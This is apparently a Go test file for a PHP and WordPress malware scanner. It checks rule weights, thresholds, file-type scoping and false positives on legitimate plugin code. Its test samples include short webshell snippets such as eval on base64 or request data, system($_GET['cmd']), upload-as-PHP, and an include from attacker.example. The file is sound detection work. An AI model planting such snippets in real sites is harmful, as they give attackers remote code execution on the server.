package antivirus

import (
	"regexp"
	"strings"
	"testing"
)

// The weighing exists so evidence can be recorded as evidence. These tests hold
// both directions of that: a rule below the threshold must produce NOTHING, and
// the rules that were findings before the weighing must still be findings.

func TestARuleBelowTheThresholdProducesNoFinding(t *testing.T) {
	set := []rule{
		{"Test.Moderate", weightModerate, regexp.MustCompile(`MODERATE`), nil},
		{"Test.Weak", weightWeak, regexp.MustCompile(`WEAK`), nil},
		{"Test.Strong", weightStrong, regexp.MustCompile(`STRONG`), nil},
		{"Test.Proof", weightProof, regexp.MustCompile(`PROOF`), nil},
	}
	cases := []struct {
		name  string
		body  string
		score int
		level string
		// wantSig is checked only when a finding is produced. Below the
		// threshold the signature is not read by anything, because no row is
		// written at all.
		wantSig string
	}{
		{"one weak signal is not a finding", "WEAK", 20, "", ""},
		{"one moderate signal is not a finding", "MODERATE", 40, "", ""},
		{"a weak and a moderate reach suspicious", "WEAK MODERATE", 60, LevelSuspicious, "Test.Moderate"},
		{"a strong signal alone is not critical", "STRONG", 60, LevelSuspicious, "Test.Strong"},
		{"a strong and a moderate reach critical", "STRONG MODERATE", 100, LevelCritical, "Test.Strong"},
		{"one proof is critical on its own", "PROOF", 100, LevelCritical, "Test.Proof"},
		{"the signature names the highest scoring rule", "WEAK PROOF STRONG", 180, LevelCritical, "Test.Proof"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			score, signature, matched, _ := verdict(evaluateWith(set, ".php", []byte(c.body)), 0)
			if score != c.score {
				t.Fatalf("score %d, want %d (rules %v)", score, c.score, matched)
			}
			level := levelFor(score, 0)
			if level != c.level {
				t.Fatalf("level %q, want %q (score %d, rules %v)", level, c.level, score, matched)
			}
			if level != "" && signature != c.wantSig {
				t.Errorf("signature %q, want %q", signature, c.wantSig)
			}
		})
	}
}

// A single regex cannot match twice in this set, so "two moderate signals"
// above is one rule matching one body. The threshold is what is being held, and
// two DISTINCT moderate rules is the case that reaches it.
func TestTwoDistinctModerateSignalsReachSuspicious(t *testing.T) {
	set := []rule{
		{"Test.ModerateA", weightModerate, regexp.MustCompile(`AAA`), nil},
		{"Test.ModerateB", weightModerate, regexp.MustCompile(`BBB`), nil},
	}
	if score, _, _, level := verdict(evaluateWith(set, ".php", []byte("AAA")), 0); level != "" {
		t.Fatalf("one moderate rule produced a finding at score %d", score)
	}
	score, _, matched, _ := verdict(evaluateWith(set, ".php", []byte("AAA and BBB")), 0)
	if got := levelFor(score, 0); got != LevelSuspicious {
		t.Fatalf("two moderate rules gave %q at score %d, want %q", got, score, LevelSuspicious)
	}
	if len(matched) != 2 {
		t.Errorf("matched %v, want both rules named", matched)
	}
}

// Every rule that predates the weighing wrote a finding on its own, so the
// weighing must not have demoted any of them. Without this, giving one of them
// a lighter weight would silently stop reporting an infection the panel used to
// report, and nothing else in the tree would notice.
func TestEveryShippedRuleIsStillCriticalOnItsOwn(t *testing.T) {
	// Named explicitly rather than derived from the set, because the point is
	// that THESE rules kept their weight while later ones were added at lighter
	// tiers. Reading the list off the set would make the test agree with
	// whatever the set happens to say.
	samples := map[string]string{
		"PHP.Webshell.EvalBase64":   `<?php eval(base64_decode($x));`,
		"PHP.Webshell.PregReplaceE": `<?php preg_replace('/(.*)/e', $_GET['c'], 'x');`,
		"PHP.Webshell.AssertInput":  `<?php assert($_POST['c']);`,
		"PHP.Webshell.SystemInput":  `<?php system($_GET['cmd']);`,
		"PHP.Webshell.KnownMarker":  `<?php // WSO shell FilesMan`,
		"PHP.Obf.CreateFunc":        `<?php $f = create_function('', base64_decode($p));`,
		"PHP.Obf.CharObfEval":       `<?php $a($b); $c = base64_decode($d);`,
	}
	byName := map[string]rule{}
	for _, h := range heuristics {
		byName[h.name] = h
	}
	for name, body := range samples {
		t.Run(name, func(t *testing.T) {
			h, ok := byName[name]
			if !ok {
				t.Fatalf("%s was removed from the rule set", name)
			}
			if h.score < scoreCritical {
				t.Fatalf("weight %d is below the critical threshold %d", h.score, scoreCritical)
			}
			score, signature, matched, _ := verdict(evaluate(".php", []byte(body)), 0)
			if levelFor(score, 0) != LevelCritical {
				t.Fatalf("%s did not reach critical on its own sample (score %d, matched %v)", name, score, matched)
			}
			if !strings.Contains(strings.Join(matched, ","), name) {
				t.Errorf("%s did not match its own sample; matched %v (signature %q)", name, matched, signature)
			}
		})
	}
}

// PHP.Webshell.RemoteInclude must require a real host after the scheme, so a
// comment or string with a quoted empty URL is not a match. A live Google Site
// Kit comment "does not include http:// or https://" was auto-quarantining a
// legitimate plugin file. A real remote include always names a host.
func TestRemoteIncludeIgnoresAQuotedEmptyURL(t *testing.T) {
	fires := func(body string) bool {
		_, _, names, _ := verdict(evaluate(".php", []byte(body)), 0)
		return strings.Contains(strings.Join(names, ","), "PHP.Webshell.RemoteInclude")
	}
	quiet := []string{
		`<?php // Does not include "http://" or "https://"`,
		`<?php $msg = 'include "http://" here';`,
	}
	for _, body := range quiet {
		if fires(body) {
			t.Errorf("RemoteInclude fired on a quoted empty URL: %q", body)
		}
	}
	if !fires(`<?php include("http://attacker.example/x.txt");`) {
		t.Error("RemoteInclude missed a real remote include with a host")
	}
}

// Every rule needs a sample it matches, or it is a pattern nobody has ever seen
// fire. This catches the case where a rule is added, is never exercised, and is
// quietly wrong: upstream shipped a preg_replace /e rule whose quote closed
// before the modifier, so it could not match any real PHP.
func TestEveryRuleMatchesSomething(t *testing.T) {
	samples := map[string]string{
		"PHP.Webshell.EvalBase64":              `<?php eval(base64_decode($x));`,
		"PHP.Webshell.PregReplaceE":            `<?php preg_replace('/(.*)/e', $_GET['c'], 'x');`,
		"PHP.Webshell.AssertInput":             `<?php assert($_POST['c']);`,
		"PHP.Webshell.SystemInput":             `<?php system($_GET['cmd']);`,
		"PHP.Webshell.KnownMarker":             `<?php // WSO shell FilesMan`,
		"PHP.Obf.CreateFunc":                   `<?php $f = create_function('', base64_decode($p));`,
		"PHP.Obf.CharObfEval":                  `<?php $a($b); $c = base64_decode($d);`,
		"PHP.Webshell.EvalSuperglobal":         `<?php eval($_POST['c']);`,
		"PHP.Webshell.VariableFunction":        `<?php $f($_REQUEST['x']);`,
		"PHP.Webshell.RemoteInclude":           `<?php include("http://attacker.example/x.txt");`,
		"PHP.Webshell.CallUserFuncInput":       `<?php call_user_func($_GET['f'], 1);`,
		"PHP.Webshell.DangerousStringCallback": `<?php preg_replace_callback('/x/', 'assert', $s);`,
		"PHP.Webshell.RemoteFetchEval":         `<?php eval(file_get_contents($u));`,
		"PHP.Webshell.MoveUploadedPHP":         `<?php move_uploaded_file($_FILES['f']['tmp_name'], 'shell.php');`,
		"PHP.Webshell.PasswordGate":            `<?php $pass = "0cc175b9c0f1b6a831c399e269772661"; if (md5($_POST['p']) === $pass) {}`,
		"PHP.Webshell.BacktickInput":           "<?php $out = `ls -la {$_GET['d']}`;",
		"PHP.Obf.ChrChain":                     `<?php $s = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109).chr(0);`,
		"PHP.Obf.GzinflateBase64":              `<?php $p = gzinflate(base64_decode($blob));`,
		"PHP.Evasion.CreateFunction":           `<?php $f = create_function('$a', 'return $a;');`,
		"PHP.Evasion.DisableIniGuard":          `<?php ini_set('disable_functions', '');`,
		"PHP.Evasion.ErrorSuppressedExec":      `<?php @system($cmd);`,
		"PHP.Evasion.BotCloaking":              `<?php if (stripos($_SERVER['HTTP_USER_AGENT'], 'googlebot') !== false) {}`,
		"PHP.Obf.HexEscapedName":               `<?php $f = "\x73\x79\x73\x74\x65\x6d";`,
		"PHP.Obf.LongBase64Block":              `<?php $b = '` + strings.Repeat("QUJDRA", 100) + `';`,
		"HTAccess.PHPHandlerInjection":         "AddType application/x-httpd-php .jpg\n",
		"JS.EvalFromCharCode":                  `eval(String.fromCharCode(97,98,99));`,
		"JS.DocumentWriteUnescape":             `document.write(unescape('%3Cscript%3E'));`,
	}
	for _, h := range heuristics {
		t.Run(h.name, func(t *testing.T) {
			body, ok := samples[h.name]
			if !ok {
				t.Fatalf("no sample for %s: a rule without one is never proven to match anything", h.name)
			}
			if !h.re.MatchString(body) {
				t.Errorf("%s does not match its own sample:\n%s", h.name, body)
			}
			// The sample must reach the rule through the walk as well: a rule
			// scoped to an extension the scan never opens can never fire, which
			// is what the .htaccess and JavaScript rules were before the walk
			// was widened.
			ext := ".php"
			if len(h.exts) > 0 {
				ext = h.exts[0]
			}
			if readLimitFor(ext) == 0 {
				t.Fatalf("%s applies to %q, which the scan does not open", h.name, ext)
			}
			if score, _, _, _ := verdict(evaluate(ext, []byte(body)), 0); score < h.score {
				t.Errorf("%s did not contribute its weight for a %s file (score %d)", h.name, ext, score)
			}
		})
	}
}

// The two file kinds the scan never used to open, and the rules that depend on
// them. Before the walk was widened these could not fire however they were
// written, so the guard has to hold the walk and the rule together.
func TestTheWidenedWalkReachesTheRulesThatNeedIt(t *testing.T) {
	cases := []struct {
		name, ext, body string
	}{
		{"php handler bound to an image extension", extHTAccess, "AddType application/x-httpd-php .jpg\n"},
		{"php handler through AddHandler", extHTAccess, "AddHandler application/x-httpd-php5 .png\n"},
		{"injected eval in a theme script", ".js", `eval(String.fromCharCode(97,98,99));`},
		{"injected eval in a module", ".mjs", `eval(String.fromCharCode(97,98,99));`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if readLimitFor(c.ext) == 0 {
				t.Fatalf("the scan does not open %q at all", c.ext)
			}
			score, _, matched, _ := verdict(evaluate(c.ext, []byte(c.body)), 0)
			if levelFor(score, 0) != LevelCritical {
				t.Errorf("not critical (score %d, matched %v)", score, matched)
			}
		})
	}
}

// A rule scoped to one kind must not be tried against another. Sharing one set
// across every file kind is only affordable because each rule declares what it
// applies to.
func TestARuleDoesNotLeakAcrossFileKinds(t *testing.T) {
	htaccess := "AddType application/x-httpd-php .jpg\n"
	if score, _, matched, _ := verdict(evaluate(".php", []byte(htaccess)), 0); score != 0 {
		t.Errorf("the .htaccess rule fired on a PHP file (score %d, %v)", score, matched)
	}
	injected := `eval(String.fromCharCode(97,98,99));`
	if score, _, matched, _ := verdict(evaluate(".php", []byte(injected)), 0); score != 0 {
		t.Errorf("a JavaScript rule fired on a PHP file (score %d, %v)", score, matched)
	}
	php := `<?php eval($_POST['c']);`
	if score, _, matched, _ := verdict(evaluate(".js", []byte(php)), 0); score != 0 {
		t.Errorf("a PHP rule fired on a JavaScript file (score %d, %v)", score, matched)
	}
}

// A JavaScript bundle is read up to a far smaller limit than a PHP file,
// because the same tree holds 152.9 MB of JavaScript against 68.7 MB of PHP.
// Reading both at the PHP limit took a measured sweep from 19 s to 55 s, which
// on a large site is the difference between a finished scan and one reported as
// partial.
func TestTheReadLimitsMatchWhatEachKindCosts(t *testing.T) {
	if readLimitFor(".php") <= readLimitFor(".js") {
		t.Error("JavaScript is read at least as far as PHP, which is the cost this limit exists to bound")
	}
	for _, ext := range []string{".jpg", ".png", ".css", ".txt", ".zip", ""} {
		if readLimitFor(ext) != 0 {
			t.Errorf("%q is opened by the scan and no rule applies to it", ext)
		}
	}
	for _, ext := range append([]string{".php", extHTAccess}, jsExts...) {
		if readLimitFor(ext) == 0 {
			t.Errorf("%q is not opened, so every rule scoped to it is dead", ext)
		}
	}
}

// The shapes upstream catches that this panel used to miss entirely. Each one
// must now produce a critical finding.
func TestThePreviouslyMissedShapesAreCaught(t *testing.T) {
	cases := []struct{ name, body string }{
		{"eval with request data", `<?php eval($_POST['c']); ?>`},
		{"variable function with request data", `<?php $f($_REQUEST['x']); ?>`},
		{"include over http", `<?php include("http://attacker.example/x.txt"); ?>`},
		{"backtick with request data", "<?php $out = `id {$_GET['u']}`;"},
		// The concatenation shape. The assignment is too far from the backtick
		// for the context group to reach it, so only the `.` alternative
		// catches this one.
		{"backtick after concatenation", "<?php $out = 'log: ' . `id {$_GET['u']}`;"},
		{"backtick as an argument", "<?php file_put_contents($f, `id {$_GET['u']}`);"},
		{"backtick with a cookie value", "<?php $out = `id {$_COOKIE['u']}`;"},
		{"upload written as php", `<?php move_uploaded_file($tmp, $dir . '/x.php');`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			score, _, matched, _ := verdict(evaluate(".php", []byte(c.body)), 0)
			if levelFor(score, 0) != LevelCritical {
				t.Errorf("not critical (score %d, matched %v)", score, matched)
			}
		})
	}
}

// A PHPDoc line describing a superglobal is not a backtick operator. WordPress
// core does this in eleven files, and matching across lines reached 184.
func TestDocumentedSuperglobalsAreNotBacktickExecution(t *testing.T) {
	documented := []struct{ name, body string }{
		{"phpdoc prose", "<?php\n/**\n * The comment parent can be updated via `$_POST['comment_parent']`.\n */"},
		{"phpdoc type line", "<?php\n/**\n *     @type bool $test_form Whether the `$_POST['action']` parameter is as expected.\n */"},
		{"inline comment", `<?php // reads ` + "`$_GET['id']`" + ` from the query string`},
		{"a stray backtick far above a superglobal", "<?php\n// see `wp_list_table`\n$x = $_GET['id'];\n"},
		// A sentence ends with a period and the next word is a backtick-quoted
		// superglobal. This is why the concatenation context requires an
		// OPERAND before the dot: a bare `.` alternative matches both of these.
		{"phpdoc sentence ending before a quoted superglobal",
			"<?php\n/**\n * Sanitises the input. `$_GET['id']` is unslashed first.\n */"},
		{"inline comment ending before a quoted superglobal",
			"<?php // handled above. `$_REQUEST['page']` is trusted here"},
	}
	for _, c := range documented {
		t.Run(c.name, func(t *testing.T) {
			score, _, matched, _ := verdict(evaluate(".php", []byte(c.body)), 0)
			if level := levelFor(score, 0); level != "" {
				t.Errorf("false alarm %q at score %d: %v", level, score, matched)
			}
		})
	}
}

// Real plugin code must not produce a finding. These are the shapes a working
// WordPress site is full of, and each one contains a word the rule set cares
// about, which is exactly why weighing them is not optional.
func TestLegitimateCodeProducesNoFinding(t *testing.T) {
	legitimate := []struct{ name, body string }{
		{"base64 without execution", `<?php $v = base64_decode($in); echo htmlspecialchars($v);`},
		{"system with a constant command", `<?php system('/usr/bin/convert in.png out.jpg');`},
		{"typical plugin bootstrap", `<?php add_action('init', function(){ $o = get_option('x'); if ($o) update_option('x', $o+1); });`},
		{"curl and json", `<?php $c = curl_init($url); curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); $r = json_decode(curl_exec($c), true);`},
		{"autoloader", `<?php require_once __DIR__ . '/vendor/autoload.php';`},
		{"the words without the shape", `<?php // this file does not use eval, nor base64_decode`},
		{"preg_replace without the e modifier", `<?php echo preg_replace('/\s+/', ' ', $text);`},
		// A WebAuthn/passkey verifier is a dense false-positive trap: it
		// base64_decodes client-supplied data, hashes it, verifies a signature,
		// and carries a high-entropy base64 public key constant. It must stay
		// clean, because it is exactly the legitimate code a naive engine flags.
		{"webauthn assertion verification", `<?php
$data = json_decode(file_get_contents('php://input'), true);
$clientDataJSON = base64_decode(strtr($data['response']['clientDataJSON'], '-_', '+/'));
$authenticatorData = base64_decode(strtr($data['response']['authenticatorData'], '-_', '+/'));
$signature = base64_decode(strtr($data['response']['signature'], '-_', '+/'));
$clientDataHash = hash('sha256', $clientDataJSON, true);
$pem = "-----BEGIN PUBLIC KEY-----\n" . chunk_split('MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAErfNi2b1IDwgK9OVyXPgNBqj1vQyj1EPTUtn2kwYNxSYcOdUFogD3CgSGJqhY0Mtp3/sizK7CWXhh19t9zY2wig==', 64, "\n") . "-----END PUBLIC KEY-----\n";
if (openssl_verify($authenticatorData . $clientDataHash, $signature, $pem, OPENSSL_ALGO_SHA256) === 1) { echo 'verified'; }`},
		{"webauthn challenge generation", `<?php $c = random_bytes(32); $_SESSION['wa'] = $c; echo rtrim(strtr(base64_encode($c), '+/', '-_'), '=');`},
	}
	for _, c := range legitimate {
		t.Run(c.name, func(t *testing.T) {
			score, _, matched, _ := verdict(evaluate(".php", []byte(c.body)), 0)
			if level := levelFor(score, 0); level != "" {
				t.Errorf("false alarm %q at score %d: %v", level, score, matched)
			}
		})
	}
}
